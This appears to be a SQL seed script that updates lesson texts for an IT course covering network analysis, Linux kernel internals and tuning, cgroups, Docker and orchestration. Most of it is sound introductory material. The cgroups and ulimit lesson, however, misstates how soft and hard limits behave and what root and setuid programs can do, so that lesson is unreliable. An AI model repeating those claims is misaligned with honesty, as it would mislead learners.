UPDATE "Lesson" SET content = 'Network traffic analysis involves monitoring and examining network communications to identify threats, performance issues, and operational problems.

1. Traffic Collection Methods: Port mirroring (SPAN) copies traffic. Network TAPs provide passive monitoring. NetFlow/sFlow provide metadata. Full packet capture records complete conversations.

2. Protocol Analysis: Use Wireshark for detailed analysis. Examine protocol headers, payloads, and timing. Identify protocol misuse and anomalies.

3. Traffic Patterns and Baselines: Establish baseline patterns to identify anomalies. Monitor normal volumes, protocol distribution, and communication patterns. Implement trend analysis.

4. Network Forensics: Reconstruct conversations from captured traffic. Analyze attack patterns and timelines. Identify data exfiltration. Preserve evidence.

5. Deep Packet Inspection: Examines packet contents beyond headers. Identifies application protocols, detects malware. Can impact performance and raises privacy considerations.

6. Traffic Analysis Tools: Wireshark for packet analysis. tcpdump for command-line capture. Zeek for security monitoring. ntopng for traffic analysis.

7. Security Applications: Detect malware communication. Identify data exfiltration. Monitor for unauthorized access. Detect reconnaissance. Support incident response.

8. Analysis Best Practices: Define clear objectives. Document procedures. Implement automated monitoring. Regular pattern analysis. Train analysts. Integrate with security operations.', "order" = 3 WHERE "sectionId" = 'c5f841ba-1cbc-4bc1-b796-fb446a705264' AND title = 'Network Traffic Analysis';
UPDATE "Lesson" SET content = 'Network troubleshooting is the systematic process of identifying, diagnosing, and resolving network problems.

1. Problem Identification: Clearly identify and document the problem. Gather information about symptoms, affected users, error messages, and when it started. Determine if consistent or intermittent.

2. Information Gathering: Collect from multiple sources. Check system logs, error messages, and device logs. Use monitoring tools. Interview users. Review recent changes.

3. Problem Isolation: Determine scope (one system, group, or network). Check if related to specific applications, protocols, or segments. Use divide-and-conquer approach.

4. Hypothesis Formation: Form hypotheses about root cause. Consider common causes. Prioritize by likelihood and ease of testing.

5. Testing and Verification: Test each hypothesis systematically. Use appropriate tools. Start with simplest tests. Document results. Avoid multiple simultaneous changes.

6. Solution Implementation: Implement the appropriate solution. Plan to minimize impact. Test in controlled environment. Document the solution.

7. Problem Documentation: Document entire process for future reference. Record symptoms, diagnostic steps, root cause, and solution. Update documentation.

8. Preventive Measures: Implement measures to prevent similar problems. Update monitoring and alerting. Document known issues. Implement redundancy. Regular maintenance.', "order" = 1 WHERE "sectionId" = 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b' AND title = 'Network Troubleshooting Methodology';
UPDATE "Lesson" SET content = 'Packet analysis and forensics involve capturing and examining network traffic to investigate security incidents and troubleshoot issues.

1. Packet Capture Methods: Use Wireshark for GUI-based capture. Use tcpdump for command-line capture. Use network TAPs for passive capture. Use port mirroring on switches.

2. Wireshark Fundamentals: Use capture filters to limit captured traffic. Use display filters to analyze specific packets. Follow TCP streams to reconstruct conversations.

3. Protocol Analysis: Examine packet headers and payloads. Identify protocol anomalies. Look for suspicious patterns like unusual ports, large data transfers, or encoded content.

4. Indicators of Compromise: Unusual DNS queries, HTTP User-Agent anomalies, TLS certificate mismatches, beaconing patterns, data exfiltration attempts.

5. Forensic Investigation: Preserve evidence properly. Create chain of custody documentation. Analyze attack timelines. Correlate with other security data.

6. Common Attack Signatures: Port scanning patterns, brute force attempts, SQL injection in HTTP traffic, command and control communication, lateral movement.

7. Network Forensics Tools: Wireshark, tcpdump, NetworkMiner, Zeek, ARKIME. Each tool provides different analysis capabilities.

8. Best Practices: Define capture objectives. Capture sufficient data. Document findings thoroughly. Preserve original captures. Follow forensic procedures.', "order" = 2 WHERE "sectionId" = 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b' AND title = 'Packet Analysis and Forensics';
UPDATE "Lesson" SET content = 'Performance monitoring tools help identify bottlenecks, track resource usage, and ensure system health.

1. System Monitoring: top and htop for real-time process monitoring. vmstat for virtual memory statistics. iostat for I/O statistics. uptime for load averages.

2. Network Monitoring: iftop for bandwidth usage per connection. nethogs for bandwidth per process. nload for network interface traffic. ss for socket statistics.

3. Connection Monitoring: ss -tuln for listening ports. lsof for open files and connections. netstat for network statistics (deprecated in favor of ss).

4. Bandwidth Testing: iperf3 for network throughput testing. speedtest-cli for internet speed testing. dd for disk throughput.

5. Disk Monitoring: iostat for disk I/O statistics. iotop for disk I/O per process. df -h for disk space usage. du -sh for directory sizes.

6. Memory Monitoring: free -h for memory usage. /proc/meminfo for detailed memory information. vmstat for virtual memory activity.

7. CPU Monitoring: top for CPU usage per process. mpstat for per-processor statistics. sar for historical data. perf for performance profiling.

8. Monitoring Best Practices: Establish baselines. Set up alerts for thresholds. Monitor trending over time. Correlate metrics across systems. Use centralized monitoring.', "order" = 3 WHERE "sectionId" = 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b' AND title = 'Performance Monitoring Tools';
UPDATE "Lesson" SET content = 'The Linux kernel is the core of the operating system, managing hardware resources and providing services to applications.

1. Kernel Types: Monolithic kernels (Linux) include all OS services in kernel space. Microkernels (QNX) keep services in user space. Hybrid kernels (Windows NT) combine both approaches.

2. Kernel Components: The scheduler manages process execution. The memory manager handles allocation and virtual memory. The Virtual File System (VFS) provides unified file access. The network stack handles communications. Device drivers interface with hardware.

3. Kernel Modules: Loadable kernel modules extend functionality without rebooting. Use lsmod to list loaded modules. Use modprobe to load modules. Use rmmod to remove modules. Use modinfo for module information.

4. Kernel Space vs User Space: Kernel space has unrestricted hardware access. User space is restricted and must use system calls. This separation provides protection and stability.

5. System Calls: System calls are the interface between user space and kernel space. Common system calls include open, read, write, close, fork, exec, and mmap. Use strace to trace system calls.

6. Interrupt Handling: Hardware devices generate interrupts to signal events. The kernel handles interrupts through interrupt service routines (ISRs). Interrupt handling must be fast to avoid blocking the system.

7. Kernel Configuration: Configure the kernel using menuconfig, xconfig, or defconfig. Compile with make. Install with make install. Update bootloader configuration.

8. Kernel Debugging: Use printk for kernel logging. Use dmesg to view kernel messages. Use kgdb for kernel debugging. Use crash for analyzing kernel dumps.', "order" = 1 WHERE "sectionId" = '9854d730-e12f-4d09-a17a-b1f94a2b7c7d' AND title = 'Kernel Architecture';
UPDATE "Lesson" SET content = 'The Linux kernel manages processes through creation, scheduling, communication, and termination.

1. Process States: Running (R) means actively executing. Sleeping (S) means waiting for an event. Disk sleep (D) means waiting for I/O. Stopped (T) means suspended. Zombie (Z) means terminated but not reaped.

2. Process Creation: The fork() system call creates a child process. The child inherits parent resources. exec() replaces the process image. The init process (PID 1) is the ancestor of all processes.

3. Process Scheduling: The Completely Fair Scheduler (CFS) uses red-black trees for O(log n) scheduling. Nice values (-20 to 19) influence priority. Real-time scheduling policies include SCHED_FIFO and SCHED_RR.

4. Process Communication: Pipes (pipe()) provide unidirectional communication. Named pipes (FIFOs) allow unrelated processes to communicate. System V IPC includes shared memory, message queues, and semaphores. Unix domain sockets provide bidirectional communication.

5. Process Signals: Signals are software interrupts. SIGTERM (15) requests termination. SIGKILL (9) forces termination. SIGHUP (1) is hangup. SIGUSR1 and SIGUSR2 are user-defined.

6. Process Priorities: Use nice to start processes with adjusted priority. Use renice to change priority of running processes. Lower nice values mean higher priority.

7. Process Monitoring: Use ps to snapshot processes. Use top for real-time monitoring. Use htop for enhanced monitoring. Use /proc filesystem for detailed process information.

8. Process Termination: Use kill to send signals to processes. Use killall to terminate by name. Use pkill for pattern matching. The kernel reaps zombie processes when parents call wait().', "order" = 2 WHERE "sectionId" = '9854d730-e12f-4d09-a17a-b1f94a2b7c7d' AND title = 'Process Management';
UPDATE "Lesson" SET content = 'The Linux kernel manages memory through virtual memory, allocation, and optimization techniques.

1. Virtual Memory: Each process has its own address space. Page tables map virtual to physical addresses. The TLB (Translation Lookaside Buffer) caches page table entries. This provides isolation between processes.

2. Memory Allocation: The buddy system allocates physical pages. Slab allocators handle small object allocation. kmalloc() allocates kernel memory. vmalloc() allocates virtually contiguous memory.

3. Page Cache: The kernel caches file data in memory. Dirty pages are modified but not yet written to disk. pdflush and kworker flush dirty pages. Page cache improves read performance significantly.

4. Swap: Swap space provides virtual memory extension. Swappiness (0-100) controls swap tendency. The OOM Killer terminates processes when memory is exhausted.

5. Memory Monitoring: free -h shows memory usage. /proc/meminfo provides detailed information. vmstat shows virtual memory statistics. /proc/[pid]/maps shows process memory mappings.

6. Memory Optimization: Use huge pages for large memory workloads. Implement memory-mapped files for I/O. Use copy-on-write for fork(). Optimize applications for memory locality.

7. Memory Protection: The kernel prevents processes from accessing each other''s memory. Read-only pages prevent modification. NX (No Execute) marks data pages as non-executable. Address Space Layout Randomization (ASLR) randomizes memory layout.

8. Memory Debugging: Use valgrind to detect memory leaks. Use AddressSanitizer for buffer overflow detection. Use /proc/[pid]/smaps for detailed memory statistics. Use kmemleak for kernel memory leak detection.', "order" = 3 WHERE "sectionId" = '9854d730-e12f-4d09-a17a-b1f94a2b7c7d' AND title = 'Memory Management';
UPDATE "Lesson" SET content = 'Performance profiling identifies bottlenecks and optimizes system resource usage.

1. CPU Profiling: Use perf for hardware-based profiling. Use strace for system call tracing. Use ltrace for library call tracing. Flame graphs visualize call stacks.

2. Common Bottlenecks: CPU bottlenecks show high %usr. I/O bottlenecks show high %wa. Memory bottlenecks show high page faults. Network bottlenecks show packet drops.

3. perf Tool: perf stat shows hardware performance counters. perf record captures profiling data. perf report analyzes captured data. perf top shows real-time profiling.

4. System Call Tracing: strace traces system calls and signals. Use -c for summary statistics. Use -f to follow child processes. Use -p to attach to running processes.

5. Library Call Tracing: ltrace traces library calls. Use -c for summary. Use -p to attach to processes. Useful for understanding application behavior with libraries.

6. Flame Graphs: Flame graphs visualize call stack profiles. Use perf to capture data and flamegraph.pl to generate graphs. Width indicates time spent. Identify optimization opportunities.

7. Profiling Strategy: Start with high-level profiling to identify bottlenecks. Drill down into specific areas. Profile in production-like environments. Consider profiling overhead.

8. Optimization: Optimize hot paths identified by profiling. Reduce unnecessary system calls. Improve cache locality. Use appropriate data structures and algorithms.', "order" = 1 WHERE "sectionId" = 'cd761025-bbfb-4135-bcf2-5be718c5cc31' AND title = 'Performance Profiling';
UPDATE "Lesson" SET content = 'Kernel tuning parameters optimize system behavior for specific workloads.

1. sysctl Overview: Use sysctl -a to view all parameters. Use sysctl -w to set parameters temporarily. Use /etc/sysctl.conf for permanent settings. Apply with sysctl -p.

2. Network Tuning: net.core.somaxconn sets maximum socket connections. tcp_fin_timeout reduces TIME_WAIT duration. net.ipv4.tcp_tw_reuse allows reuse of TIME_WAIT sockets. net.core.netdev_max_backlog sets packet queue length.

3. File System Tuning: fs.file-max sets maximum open files system-wide. fs.inotify.max_user_watches sets inotify limits. fs.aio-max-nr sets maximum async I/O events.

4. Memory Tuning: vm.swappiness controls swap tendency. vm.overcommit_memory controls memory overcommit behavior. vm.dirty_ratio controls dirty page thresholds. vm.min_free_kbytes reserves minimum free memory.

5. Security Tuning: net.ipv4.conf.all.rp_filter enables reverse path filtering. net.ipv4.icmp_echo_ignore_broadcasts ignores broadcast pings. kernel.randomize_va_space enables ASLR.

6. Performance Tuning: kernel.sched_min_granularity_ns controls scheduler granularity. kernel.hung_task_timeout_secs detects hung tasks. vm.zone_reclaim_mode controls NUMA memory reclaim.

7. Monitoring Changes: Monitor system behavior after tuning. Use sysbench or similar tools to benchmark. Document all changes. Roll back if performance degrades.

8. Best Practices: Tune one parameter at a time. Understand the impact before changing. Test in staging environment. Document all changes.', "order" = 2 WHERE "sectionId" = 'cd761025-bbfb-4135-bcf2-5be718c5cc31' AND title = 'Kernel Tuning Parameters';
UPDATE "Lesson" SET content = 'Resource limits and control groups (cgroups) manage system resource allocation and isolation.

1. ulimit: ulimit -a displays all limits. ulimit -n sets open file limits. ulimit -u sets process limits. Configure in /etc/security/limits.conf.

2. Resource Limits: Hard limits are enforced by the kernel. Soft limits are warnings that can be exceeded. setuid programs can exceed soft limits. Root can exceed soft limits but not hard limits.

3. cgroups Overview: cgroups limit, account, and isolate resource usage. cgroups v2 is the current standard. Resources include CPU, memory, I/O, and network.

4. cgroups v2: Mount the cgroup filesystem. Create control groups. Assign processes. Set limits. Monitor usage. Each controller (cpu, memory, io) provides specific controls.

5. CPU Limits: cpu.max sets CPU bandwidth limit. cpu.weight sets relative CPU shares. cpuset.cpus assigns CPU cores. cpuset.mems assigns memory nodes.

6. Memory Limits: memory.max sets hard memory limit. memory.high sets throttling threshold. memory.swap.max limits swap usage. memory.oom.group controls OOM behavior.

7. Docker and cgroups: Docker uses cgroups for resource isolation. Configure with --cpus, --memory, --memory-swap. Use docker stats to monitor. Use systemd-cgtop for system-wide view.

8. Monitoring and Management: Monitor cgroup resource usage. Use systemctl status to check service resources. Use journalctl for logs. Adjust limits based on workload requirements.', "order" = 3 WHERE "sectionId" = 'cd761025-bbfb-4135-bcf2-5be718c5cc31' AND title = 'Resource Limits and cgroups';
UPDATE "Lesson" SET content = 'Docker is a platform for developing, shipping, and running applications in containers. Containers package applications with their dependencies.

1. Core Concepts: An image is a read-only template. A container is a running instance. A Dockerfile defines the build process. A registry stores and distributes images.

2. Docker Architecture: The Docker daemon (dockerd) manages containers. The Docker client (docker) communicates with the daemon. Images are stored in registries. Containers run isolated from each other.

3. Basic Commands: docker build -t name . builds an image. docker run -d -p 8080:80 name runs a container. docker ps lists running containers. docker logs container_id views logs. docker exec runs commands in containers.

4. Image Management: docker images lists images. docker pull downloads images. docker push uploads images. docker rmi removes images. Use specific tags for version control.

5. Container Lifecycle: docker start/stop/restart manage containers. docker rm removes containers. docker pause/unpause suspends containers. Use -d for detached mode. Use --rm for automatic cleanup.

6. Dockerfile Instructions: FROM sets base image. RUN executes commands. COPY/ADD copies files. EXPOSE documents ports. CMD/ENTRYPOINT sets startup command. ENV sets environment variables.

7. Best Practices: Use official base images. Minimize layers. Use .dockerignore. Run as non-root users. Use multi-stage builds. Scan images for vulnerabilities.

8. Security Considerations: Use minimal base images. Don''t store secrets in images. Use Docker Content Trust. Implement resource limits. Use read-only filesystems where possible.', "order" = 1 WHERE "sectionId" = 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372' AND title = 'Docker Fundamentals';
UPDATE "Lesson" SET content = 'Docker image optimization reduces size, improves build speed, and enhances security.

1. Multi-stage Builds: Separate build and runtime stages. Build in builder stage, copy artifacts to production stage. Dramatically reduces final image size. Example: build Node.js app in node:18, run in node:18-alpine.

2. Layer Optimization: Combine RUN commands to reduce layers. Order layers from least to most frequently changing. Use COPY for specific files instead of ADD. Clean up in the same layer you create files.

3. Base Image Selection: Use official images. Prefer Alpine Linux for minimal size. Use specific tags instead of latest. Consider distroless images for maximum security.

4. .dockerignore: Exclude unnecessary files from build context. Exclude node_modules, .git, test files, documentation. Reduces build time and image size.

5. Build Caching: Docker caches layers. Order Dockerfile instructions to maximize cache hits. Put rarely changing instructions first. Use --no-cache to force rebuild.

6. Image Security: Scan images with Trivy, Snyk, or Docker Scout. Use non-root users. Don''t install unnecessary packages. Keep base images updated.

7. Image Inspection: Use docker history to see layers. Use docker inspect for metadata. Use docker diff to see filesystem changes. Use dive for detailed layer analysis.

8. Registry Management: Use semantic versioning for tags. Implement retention policies. Use private registries for proprietary images. Enable image signing with Docker Content Trust.', "order" = 2 WHERE "sectionId" = 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372' AND title = 'Image Building and Optimization';
UPDATE "Lesson" SET content = 'Docker networking enables container communication and external connectivity.

1. Network Types: bridge is the default network type. host removes network isolation. overlay enables multi-host networking. none disables networking. macvlan assigns MAC addresses.

2. Bridge Networking: Containers on the same bridge network can communicate. Docker creates a virtual bridge (docker0). Containers get IP addresses from a subnet. Port mapping enables external access.

3. DNS Resolution: Containers resolve each other by name on custom bridge networks. Use container_name or service names. Default bridge network requires legacy linking.

4. Port Mapping: -p host:container maps ports. -P maps all exposed ports. Use -p 8080:80 for HTTP. Use -p 3306:3306 for MySQL. Multiple mappings are supported.

5. Custom Networks: Create custom bridges for better isolation. docker network create mynet. docker network connect/disconnect manages connections. Custom networks provide DNS resolution.

6. Network Security: Use --internal for isolated networks. Implement network segmentation. Use custom bridges instead of default. Limit container communication.

7. Overlay Networks: Enable multi-host networking for Swarm or Kubernetes. Use encrypted overlay for sensitive data. Requires key-value store for service discovery.

8. Network Troubleshooting: Use docker network inspect to view network configuration. Use docker exec to test connectivity. Use nslookup inside containers. Check iptables rules for port mapping issues.', "order" = 3 WHERE "sectionId" = 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372' AND title = 'Docker Networking';
UPDATE "Lesson" SET content = 'Docker Compose defines and runs multi-container Docker applications using a YAML file.

1. Compose File Structure: Top-level keys include version, services, volumes, and networks. Each service defines a container. Services share networks and can share volumes.

2. Basic Commands: docker-compose up -d starts services. docker-compose down stops and removes. docker-compose ps shows status. docker-compose logs -f follows logs. docker-compose exec runs commands.

3. Service Definition: Each service has an image or build context. Configure ports, volumes, environment variables, and dependencies. Use restart: always for auto-restart.

4. Environment Variables: Use environment: for inline variables. Use env_file: for variable files. Use .env files for default values. Variables override .env file values.

5. Volumes: Named volumes persist data. Bind mounts map host paths. Define volumes at top level and reference in services. Use volumes for databases and uploads.

6. Networks: Define custom networks for service isolation. Services on the same network can communicate by service name. Use different networks for frontend and backend.

7. Health Checks: Define health checks for services. Use depends_on with condition: service_healthy. Ensures services start in correct order.

8. Best Practices: Use specific image versions. Define health checks. Use .env files for secrets. Implement resource limits. Use named volumes for persistence.', "order" = 1 WHERE "sectionId" = '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5' AND title = 'Docker Compose Fundamentals';
UPDATE "Lesson" SET content = 'A typical multi-service architecture includes web servers, application servers, databases, and caches.

1. Typical Stack: nginx (reverse proxy), frontend (React/Vue), api (Node.js/Python), db (PostgreSQL/MySQL), redis (caching). Each service has specific responsibilities.

2. Service Dependencies: Use depends_on to control startup order. Implement health checks for reliable dependencies. Use init systems or entrypoint scripts for initialization.

3. Network Segmentation: Create separate networks for frontend and backend. Only expose necessary services to the frontend network. Database should only be accessible from backend.

4. Database Initialization: Use init scripts for database setup. Mount SQL files for schema creation. Use environment variables for database credentials. Implement backup strategies.

5. Caching Layer: Use Redis for session storage and caching. Configure appropriate memory limits. Implement cache invalidation strategies. Monitor cache hit rates.

6. Load Balancing: Use nginx for load balancing across multiple instances. Configure health checks for backend services. Use least-connections algorithm for optimal distribution.

7. Logging: Aggregate logs from all services. Use docker-compose logs for debugging. Implement centralized logging with ELK or similar. Use structured logging formats.

8. Monitoring: Monitor service health and performance. Use Prometheus and Grafana for metrics. Set up alerts for critical failures. Monitor resource usage across services.', "order" = 2 WHERE "sectionId" = '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5' AND title = 'Multi-Service Architecture';
UPDATE "Lesson" SET content = 'Production deployment with Docker Compose requires careful configuration for reliability, security, and performance.

1. Health Checks: Define health checks for all critical services. Use depends_on with condition: service_healthy. Monitor health status regularly. Implement automatic restart on failure.

2. Resource Limits: Set memory limits for all services. Configure CPU limits to prevent resource starvation. Use deploy.resources for Swarm mode. Monitor resource usage.

3. Logging Configuration: Configure logging drivers. Set log rotation policies. Use json-file or syslog drivers. Implement centralized log collection.

4. Secrets Management: Use Docker secrets or environment files. Never commit secrets to version control. Rotate secrets regularly. Use vault solutions for sensitive data.

5. SSL/TLS: Configure SSL certificates. Use Let''s Encrypt for automated certificate management. Implement HTTPS redirect. Configure HSTS headers.

6. Backup Strategies: Implement regular database backups. Use volume backups for persistent data. Test backup restoration procedures. Store backups off-site.

7. Monitoring and Alerting: Implement health monitoring. Set up performance metrics collection. Configure alerts for failures. Monitor service dependencies.

8. Deployment Checklist: Verify all health checks pass. Confirm resource limits are set. Validate SSL certificates. Test backup procedures. Document deployment configuration.', "order" = 3 WHERE "sectionId" = '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5' AND title = 'Production Deployment';
UPDATE "Lesson" SET content = 'Container orchestration automates deployment, scaling, and management of containerized applications.

1. Why Orchestration: Manual container management doesn''t scale. Orchestration provides automated deployment, self-healing, load balancing, service discovery, and rolling updates.

2. Orchestration Features: Automated scheduling places containers on appropriate nodes. Self-healing restarts failed containers. Horizontal scaling adjusts instance counts. Service discovery enables inter-service communication.

3. Kubernetes Architecture: The control plane includes the API server, etcd (state store), scheduler, and controller manager. Worker nodes run kubelet, kube-proxy, and container runtime.

4. Kubernetes Concepts: A Pod is the smallest deployable unit. A Deployment manages replica sets and updates. A Service provides stable network endpoints. A ConfigMap and Secret manage configuration.

5. Docker Swarm: Docker''s native orchestration. Initialize with docker swarm init. Deploy with docker stack deploy. Scale with docker service scale. Simpler than Kubernetes but less feature-rich.

6. Service Discovery: Containers need to find each other. Kubernetes provides DNS-based service discovery. Swarm uses built-in DNS. Consul and etcd provide external service discovery.

7. Load Balancing: Distribute traffic across container instances. Kubernetes uses Services and Ingress controllers. Swarm uses built-in round-robin load balancing. External load balancers can be used.

8. Choosing a Solution: Kubernetes is complex but powerful. Docker Swarm is simple but limited. Consider team expertise, cluster size, and feature requirements. Start simple and migrate as needed.', "order" = 1 WHERE "sectionId" = '61a08aeb-28b8-41f8-9c8d-169511f8a50c' AND title = 'Container Orchestration Concepts';